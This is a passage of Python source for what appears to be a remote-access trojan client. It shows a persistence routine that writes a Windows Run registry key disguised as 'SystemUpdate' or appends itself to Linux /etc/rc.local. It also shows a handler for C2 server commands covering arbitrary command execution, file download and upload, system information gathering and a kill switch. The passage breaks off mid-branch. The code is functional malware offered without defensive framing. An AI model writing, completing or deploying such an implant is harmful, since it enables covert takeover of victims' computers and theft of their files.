        return info

    def persist(self):
        """Implement persistence mechanism"""
        try:
            if platform.system() == 'Windows':
                # Windows persistence via registry
                import winreg
                key = winreg.HKEY_CURRENT_USER
                run_key = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(run_key)
            else:
                # Linux persistence via cron or rc.local
                script_path = os.path.abspath(sys.argv[0])
                with open('/etc/rc.local', 'a') as f:
                    f.write(f"{sys.executable} {script_path} &\n")
        except Exception as e:
            print(f"Persistence setup failed: {e}")

    def handle_command(self, command_data):
        """Process commands received from C2 server"""
        action = command_data.get('action')

        if action == 'execute':
            command = command_data.get('command')
            result = self.execute_command(command)
            return result

        elif action == 'download':
            file_path = command_data.get('path')
            return self.transfer_file(file_path, 'download')

        elif action == 'upload':
            file_path = command_data.get('path')
            content = command_data.get('content')
            try:
                decoded = base64.b64decode(content)
                with open(file_path, 'wb') as f:
                    f.write(decoded)
                return {'success': True}
            except Exception as e:
                return {'error': str(e)}

        elif action == 'info':
            return self.gather_system_info()

        elif action == 'persist':
            self.persist()
            return {'success': True}

        elif action == 'kill':
            self.should_run = False
            return {'success': True}

        elif action == 'screenshot':
